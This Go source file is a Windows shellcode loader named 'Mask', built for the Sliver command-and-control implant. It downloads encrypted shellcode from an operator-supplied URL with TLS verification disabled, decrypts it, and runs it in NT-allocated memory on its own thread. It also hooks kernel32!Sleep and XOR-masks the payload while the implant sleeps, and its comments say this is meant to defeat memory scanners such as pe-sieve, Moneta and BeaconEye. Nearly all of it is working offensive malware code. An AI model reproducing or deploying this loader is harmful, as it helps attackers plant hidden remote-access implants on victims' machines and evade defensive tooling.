//go:build windows && amd64

// Mask is a Windows shellcode host that XOR-encrypts the Sliver shellcode in
// memory whenever it intercepts a Sleep call, then decrypts on wake.
//
// Injected at compile time via -ldflags:
//
//	-X main.PayloadURL=https://...
//	-X main.KeyHex=<64 hex chars>    (32-byte ChaCha20 key)
//	-X main.NonceHex=<24 hex chars>  (12-byte nonce)
//	-X main.SleepMS=30000            (Sliver beacon sleep interval in ms)
//
// Execution flow:
//  1. Fetch + ChaCha20-Poly1305 decrypt the Sliver shellcode
//  2. NtAllocateVirtualMemory(self, RW) — allocate shellcode page
//  3. Install Sleep hook in kernel32 (patches own process's kernel32 mapping)
//  4. NtProtectVirtualMemory(self, RX) — no RWX ever held
//  5. NtCreateThreadEx(self) — shellcode starts on its own OS thread
//  6. main goroutine parks; hook fires on every Sleep call:
//     VirtualProtect(RX→RW) → XOR → real Sleep (via KernelBase.dll) → XOR → VirtualProtect(RW→RX)
//  7. Timer-based backup masking (in case shellcode uses non-Sleep waits):
//     goroutine suspends shellcode thread, masks for ~500ms every SleepMS
//
// Evasion provided:
//   - Shellcode bytes are XOR-encrypted during sleep intervals
//   - Memory scanners (pe-sieve, Moneta, BeaconEye) see encrypted garbage at rest
//   - NT-native memory allocation (no VirtualAlloc fingerprint)
//   - No RWX pages
//   - Hook intercepts Win32 Sleep calls synchronously (no race with execution)
//
// Limitation (documented):
//   Sliver uses Go's time.Sleep which ultimately parks goroutines via
//   NtWaitForSingleObject, NOT kernel32!Sleep. The Sleep hook catches
//   occasional Win32 Sleep(0) yield calls. The backup timer provides
//   additional coverage for the main callback interval.
package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"unsafe"

	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/sys/windows"
)

// Injected by sleepkit build (or manually via -ldflags).
var (
	PayloadURL = ""
	KeyHex     = ""
	NonceHex   = ""
	SleepMS    = "30000"
)

func main() {
	key, err := hex.DecodeString(KeyHex)
	if err != nil || len(key) != chacha20poly1305.KeySize {
		return
	}
	nonce, err := hex.DecodeString(NonceHex)
	if err != nil || len(nonce) != chacha20poly1305.NonceSize {
		return
	}

	ct, err := fetchPayload(PayloadURL)
	if err != nil || len(ct) == 0 {
		return
	}

	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return
	}
	shellcode, err := aead.Open(nil, nonce, ct, nil)
	if err != nil {
		return
	}

	// Allocate RW memory for shellcode.
	size := uintptr(len(shellcode))
	base, err := ntAlloc(size)
	if err != nil {
		return
	}

	// Copy shellcode bytes.
	dst := unsafe.Slice((*byte)(unsafe.Pointer(base)), size)
	copy(dst, shellcode)
	shellcode = nil // drop plaintext reference

	// Generate random 32-byte XOR key for sleep masking.
	var xorKey [32]byte
	if _, err := rand.Read(xorKey[:]); err != nil {
		return
	}
	initMask(base, size, xorKey)

	// Install inline hook at kernel32!Sleep.
	if err := installSleepHook(); err != nil {
		// Non-fatal: hook failure is documented; timer backup still runs.
		_ = err
	}

	// Protect shellcode RX — never RWX.
	if err := ntProtect(base, size, windows.PAGE_EXECUTE_READ); err != nil {
		return
	}

	// Launch shellcode on a dedicated OS thread (outside Go scheduler).
	hThread, err := ntCreateThread(base)
	if err != nil {
		return
	}

	// Start timer-based backup masking goroutine.
	go timerMaskLoop(hThread)

	// Park main goroutine. The shellcode thread and backup goroutine keep the
	// process alive. select{} never returns.
	select {}
}

func fetchPayload(url string) ([]byte, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			//nolint:gosec // self-signed operator cert; payload integrity via ChaCha20-Poly1305 AEAD
			InsecureSkipVerify: true,
		},
	}
	resp, err := (&http.Client{Transport: tr}).Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// intFromStr parses a decimal integer from a string injected via ldflags.
// Returns the default value on any error.
func intFromStr(s string, def int) int {
	n := def
	fmt.Sscanf(s, "%d", &n)
	return n
}
